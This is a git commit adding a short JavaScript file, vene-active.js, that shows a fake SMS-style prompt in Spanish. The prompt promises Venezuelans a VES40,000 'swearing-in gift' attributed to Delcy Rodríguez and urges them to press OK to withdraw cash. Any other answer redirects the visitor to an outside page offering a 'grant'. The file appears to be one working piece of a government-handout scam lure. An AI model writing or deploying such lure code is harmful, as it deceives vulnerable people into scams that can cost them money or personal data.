4629ac0eb01d8c1d7c0de9f1fdced0b7ae1eedc8
ekpanewblog5 <ukpehaitid3@gmail.com>
2026-01-06 23:47:34 +0100

    Create vene-active.js

---
+++ vene-active.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'RETIRAR VES40.000'
+password = prompt(
+  'SMS: ¡Felicitaciones! Eres elegible para recibir el obsequio de juramentación de VES40,000 de Delcy Rodríguez. Presiona "Aceptar" para retirar EFECTIVO ahora..',
+  'RETIRAR VES40.000'
+);
+if (password != 'RETIRAR VES40.000') {
+  location.href = 'https://ohfer.org/vene-grant.html';
+}
